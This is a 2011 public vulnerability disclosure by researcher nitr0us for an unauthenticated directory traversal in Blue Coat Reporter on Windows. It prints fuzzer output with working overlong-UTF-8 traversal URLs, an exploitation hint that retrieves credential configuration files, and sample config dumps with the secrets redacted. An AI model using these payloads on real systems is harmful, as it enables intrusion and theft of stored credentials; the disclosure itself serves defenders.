# Exploit Title: Blue Coat Reporter Unauthenticated Directory Traversal
# Author: nitr0us / http://twitter.com/nitr0usmx
# Software Link: http://www.bluecoat.com/products/reporter
# Version: 9.2.x - 9.1.x
# Tested on: Windows Server 2003 Standard


Blue Coat Reporter Unauthenticated Directory Traversal
=================================================================================
### PUBLIC RELEASE ###
My gift to Ekoparty Security Conference 2011 @ Argentina
What a great event!
21/Sept/2011
### PUBLIC RELEASE ###



Vulnerability Information
=================================================================================
Vendor:          Blue Coat Systems, Inc. (NASDAQ: BCSI) - http://www.bluecoat.com
Product:         Blue Coat Reporter - http://www.bluecoat.com/products/reporter
Versions:        9.2.x - 9.1.x
Platform:        Windows (the Linux installation is not vulnerable)
Tested on:       Blue Coat Reporter 9.2.3 on Windows Server 2003 Standard
Vulnerability:   Directory Traversal
CVSS v2 Score:   8.3 (High) [ AV:A/AC:L/Au:N/C:C/I:C/A:C ]
Author:          Alejandro Hernandez H. (nitr0us) / http://twitter.com/nitr0usmx
Discovery Date:  April 14th, 2011
Public Release:  September 21th, 2011 @ Ekoparty Security Conference
Vendor Response: Blue Coat has confirmed the existence of a patch for 9.3.1.1 but
                 until *now* there is no patch for 9.2.x nor 9.1.x
Vendor Advisory: https://kb.bluecoat.com/index?page=content&id=SA60



Product Information
=================================================================================
Blue Coat Reporter gives managers powerful visibility into all Web-related user 
activity. Beyond URL Filtering, Reporter provides customizable, at-a-glance 
dashboards and reports along with intuitive drill-down capabilities making it an 
invaluable part of security, compliance, bandwidth management, and other 
business-critical efforts necessary in todays competitive environment.

Reporter quickly processes robust log data from Blue Coat ProxySG and ProxyClient 
along with conveyed data from Webfilter and ProxyAV, providing easy-to-view 
reports for security specialists, department managers, HR managers, and network 
administrators. Blue Coat Reporter provides the ultimate architecture for 
complete Web visibility and control.

Security administrators can evaluate risks and track user activity that is 
potentially dangerous, and quickly determine users with malicious content, 
including spyware. Plus, view a security analysis with sub-reports that include 
malware ids, malware IP detail, malware URL detail and malware user detail. 
Security views provide administrators with greater visibility into the strength 
and stability of their network.

FEATURES:
- Comprehensive Security and Web Traffic Information
- Real-Time Dashboard
- Threat Protection Reporting
- Flexible Reporting
- Scalable Performance
- Content Filtering and Trend Analysis
- Customized Access
- Views: Administrator, HR, Security and Technical



Vulnerability Discovery (some info has been replaced with X's)
=================================================================================
I found this vulnerability with DotDotPwn v3.0beta fuzzer:

#./dotdotpwn.pl -m http -h 10.X.X.X -x 8081 -d 3 -f boot.ini -q
#################################################################################
#                                                                               #
#  CubilFelino                                                       Chatsubo   #
#  Security Research Lab              and            [(in)Security Dark] Labs   #
#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
#                                                                               #
#                               pr0udly present:                                #
#                                                                               #
#  ________            __  ________            __  __________                   #
#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
#          \/                      \/                                      \/   #
#                            - DotDotPwn v3.0 Beta -                            #
#                         The Directory Traversal Fuzzer                        #
#                         http://dotdotpwn.sectester.net                        #
#                            dotdotpwn@sectester.net                            #
#                                                                               #
#                              by chr1x & nitr0us                               #
#################################################################################

[========== TARGET INFORMATION ==========]
[+] Hostname: 10.X.X.X
[+] Protocol: http
[+] Port: 8081
Blue Coat Reporter
[=========== TRAVERSAL ENGINE ===========]
[+] Creating Traversal patterns (mix of dots and slashes)
[+] Multiplying 3 times the traversal patterns (-d switch)
[+] Creating the Special Traversal patterns
[+] Translating (back)slashes in the filenames
[+] Appending 'boot.ini' to the Traversal Strings
[+] Including Special sufixes
[+] Traversal Engine DONE ! - Total traversal tests created: 300

[=========== TESTING RESULTS ============]
[+] Ready to launch 3.33 traversals per second
[+] Press any key to start the testing (You can stop it pressing Ctrl + C)

[*] Testing Path: http://10.X.X.X:8081/%c0.%c0./%c0.%c0./%c0.%c0./boot.ini <- VULNERABLE!
[*] Testing Path: http://10.X.X.X:8081/%c0.%c0.\%c0.%c0.\%c0.%c0.\boot.ini <- VULNERABLE!
[*] Testing Path: http://10.X.X.X:8081/%c0.%c0.%2f%c0.%c0.%2f%c0.%c0.%2fboot.ini <- VULNERABLE!
[*] Testing Path: http://10.X.X.X:8081/%c0.%c0.%5c%c0.%c0.%5c%c0.%c0.%5cboot.ini <- VULNERABLE!
[*] Testing Path: http://10.X.X.X:8081/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini <- VULNERABLE!
[*] Testing Path: http://10.X.X.X:8081/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini <- VULNERABLE!
[*] Testing Path: http://10.X.X.X:8081/%c0%2e%c0%2e%2f%c0%2e%c0%2e%2f%c0%2e%c0%2e%2fboot.ini <- VULNERABLE!
[*] Testing Path: http://10.X.X.X:8081/%c0%2e%c0%2e%5c%c0%2e%c0%2e%5c%c0%2e%c0%2e%5cboot.ini <- VULNERABLE!
[*] Testing Path: http://10.X.X.X:8081/%c0.%c0.%c0%2f%c0.%c0.%c0%2f%c0.%c0.%c0%2fboot.ini <- VULNERABLE!
[*] Testing Path: http://10.X.X.X:8081/%c0.%c0.%c0%5c%c0.%c0.%c0%5c%c0.%c0.%c0%5cboot.ini <- VULNERABLE!
[*] Testing Path: http://10.X.X.X:8081/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini <- VULNERABLE!
[*] Testing Path: http://10.X.X.X:8081/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini <- VULNERABLE!

[+] Fuzz testing finished after 1.55 minutes (93 seconds)
[+] Total Traversals found: 12



Exploitation hints (some info has been replaced with X's)
=================================================================================
According to Blue Coat's knowledge base (https://kb.bluecoat.com/index?page=content&id=FAQ372), 
some of the common configuration files are located in:
Windows: <installed drive>/Program Files/Bluecoat Reporter 9/settings

If you try to get the configuration files in the way showed below, it will not work:
http://10.X.X.X:8081/%c0.%c0./%c0.%c0./%c0.%c0./Program%20Files/Bluecoat%20Reporter%209/settings/local_users.cfg

But, if you send the request in this another way ;), it works pretty well:
http://10.X.X.X:8081/%c0.%c0./%c0.%c0./%c0.%c0./progra~1/blueco~1/settings/local_users.cfg

Some interesting content within the configuration files:

local_users.cfg:
local_users = {
  user_admin = {
    username = "admin"
    b64username = "YWRtaW4="
    password_checksum = "XXXXXXXXXXXXXXXXXXXXXXXXXXXX"
    administrator = "true"
    last_login = "1306513774"
    roles = ""
    email = "foo@bar.com.mx"
  } # user_admin
} # local_users


log_sources.cfg:
log_sources = {
  assigned = {
    assigned_XXXXXXXXXXXXXXXXXXXXXXXXXXX = {
      type = "ftp"
      port = "21"
      match_compressed = "true"

      state = "enable"
      filename = "*.log"
      label = "Blue Coat ProxySG"
      database = "database_XXXXXXXXXXXXXXXXXXXXXXXX"
      hostname = "10.X.X.X"
      username = "proxysg"
      password = "XXXXXXXXXXXXXXXXXX"
      dirname = "/"
      process_subdirectories = "false"
      post = "rename"
    } # assigned_XXXXXXXXXXXXXXXXXXXXXXXXXXX
  } # assigned
} # log_sources


preferences.cfg:
preferences = {
  version = "9.2.3.1"
...
      recipients = {
        to = "foo@bar.com.mx"
  limits = {
    max_databases = "50"
    max_sources = "150"
    max_templates = "100"
    max_users = "100"
    max_roles = "100"
    max_realms = "10"
    max_groups = "100"
    max_panes = "25"
    max_saved_reports = "250"
    max_filter_templates = "25"
  } # limits
  smtp_server = {
    primary = {
      password = "XXXXXXXXXXXXXXX"
      hostname = "10.X.X.X"
      username = "XXXXXXXXXXXXXXX"
    } # primary
  system_event_log = {
    directory = "C:/Program Files/Blue Coat Reporter 9/journal/"
    enable_audit_log = "true"
  } # system_event_log
  explicit_proxy = {
    http = {
      ip = "10.X.X.X"
      port = "8080"
      username = "XXXXXXXXXX"
      password = "XXXXXXXXXX"
      enabled = "false"
    } # http
  paths = {
    databases = "C:/Program Files/Blue Coat Reporter 9/databases/"
    journal = "C:/Program Files/Blue Coat Reporter 9/journal/"
    archive = "C:/Program Files/Blue Coat Reporter 9/archive/"
  } # paths
} # preferences

schedule.cfg:
schedule = {
  database_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX = {
    description = "Foo Bar"
    type = "expire_database"
    data = "1"
    database = "database_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
    deleteOnCompletion = "false"
    enabled = "true"
    runStatus = "completed"
    priority = "low"
    frequency = {
      type = "day"
      minute = {
        0 = "0"
      } # minute
      hour = {
        0 = "18"
      } # hour
    } # frequency
    next_run_time = "1307746837"
    diagnosticInfo = {
      next_run_time = "06/10/2011 23:00:37"
      last_run_time = "06/09/2011 23:00:37"
    } # diagnosticInfo
    last_run_time = "1307746837"
  } # database_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
} # schedule



Greets
=================================================================================
Special thanks to Tammy Green from Blue Coat: It was a pleasure to work with you
in the follow-up of this vulnerability.

Also, special greets to my Argentinian friends Xava Du & Federico L. Bossi:
I'm having a great time in Buenos Aires and in Ekoparty.

To some friends, chr1x, CRAc, hkm, alt3kx, tr3w, dex, LightOS, Sirdarckat, calderpwn, 
b0rr3x, beck, daemon, scp.scorpion, Caar2000, Rolman, #mendozaaaa, Raaka_elgaupo, 
vendetta, zeus, Hector López, etc. etc. etc.. 



Author
=================================================================================
Author:  nitrØus  [ Alejandro Hernandez H. ]
E-mail:  nitrousenador -at- gmail -dot- com
Twitter: http://twitter.com/nitr0usmx
Website: http://www.brainoverflow.org
         http://chatsubo-labs.blogspot.com
Country: Mexico